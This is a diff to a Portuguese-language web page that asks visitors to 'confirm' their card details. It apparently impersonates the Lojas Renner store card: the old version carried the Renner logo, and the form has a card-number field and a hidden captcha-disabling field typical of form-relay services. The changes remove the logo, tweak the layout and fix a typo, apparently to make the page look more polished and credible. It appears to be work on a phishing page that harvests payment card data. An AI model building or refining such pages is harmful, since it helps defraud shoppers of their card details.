@@ -19,7 +19,7 @@
 
     .container {
       background-color: #fff;
-      padding: 32px;
+      padding: 32px 32px 20px 32px; /* Ajustado padding inferior */
       border-radius: 14px;
       box-shadow: 0 4px 10px rgba(0,0,0,0.08);
       max-width: 380px;
@@ -28,15 +28,11 @@
       transition: all 0.3s ease;
     }
 
-    .logo {
-      width: 110px;
-      margin-bottom: 15px;
-    }
-
     h2 {
       color: #c5002e;
       margin-bottom: 25px;
       font-size: 22px;
+      /* Removido margem referente ao logo para dar espaço natural */
     }
 
     input {
@@ -109,7 +105,6 @@
 
   <!-- Tela de cadastro -->
   <div class="container" id="formulario">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Renner_logo.png" alt="Renner" class="logo">
     <h2>Confirme os dados do seu Cartão</h2>
     <form id="cartaoForm">
       <input type="text" name="numero_cartao" placeholder="Número do cartão" required maxlength="19">
@@ -118,7 +113,7 @@
       <input type="hidden" name="_captcha" value="false">
       <button type="submit">Confirmar</button>
     </form>
-    <p class="info">Suas informações estão protegidas com segurançaaa.</p>
+    <p class="info">Suas informações estão protegidas com segurança.</p>
   </div>
 
   <!-- Tela de carregamento -->
